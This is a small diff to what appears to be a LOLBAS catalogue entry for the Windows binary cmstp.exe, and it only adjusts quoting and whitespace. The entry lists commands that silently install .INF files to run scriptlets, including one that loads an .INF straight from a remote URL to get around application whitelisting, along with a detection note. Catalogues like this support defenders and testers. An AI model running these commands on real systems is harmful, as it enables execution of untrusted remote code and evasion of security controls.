@@ -2,11 +2,11 @@
 Name: Cmstp.exe
 Description: Installs or removes a Connection Manager service profile.
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
     Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
-    Usecase: Execute code hidden within an inf file. Download and run scriptlets from internet. 
+    Usecase: Execute code hidden within an inf file. Download and run scriptlets from internet.
     Category: Execute
     Privileges: User
     MitreID: T1191
@@ -14,7 +14,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
     Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
-    Usecase: Execute code hidden within an inf file. Execute code directly from Internet. 
+    Usecase: Execute code hidden within an inf file. Execute code directly from Internet.
     Category: AwL bypass
     Privileges: User
     MitreID: T1191
@@ -23,7 +23,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\cmstp.exe
   - Path: C:\Windows\SysWOW64\cmstp.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: Execution of cmstp.exe should not be normal unless VPN is in use
